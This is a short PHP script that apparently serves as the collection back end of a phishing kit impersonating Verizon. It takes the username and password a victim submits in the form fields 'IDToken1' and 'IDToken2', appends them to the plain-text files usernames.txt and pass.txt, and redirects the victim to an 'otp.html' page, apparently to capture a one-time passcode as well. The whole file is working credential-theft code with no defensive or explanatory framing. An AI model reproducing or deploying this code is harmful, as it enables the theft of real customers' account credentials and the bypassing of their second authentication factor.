<?php

file_put_contents("usernames.txt", "Verizon Username : " . $email = $_POST['IDToken1'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Verizon Password : " . $pass = $_POST['IDToken2'] . "\n", FILE_APPEND);
header('Location: otp.html');
?>
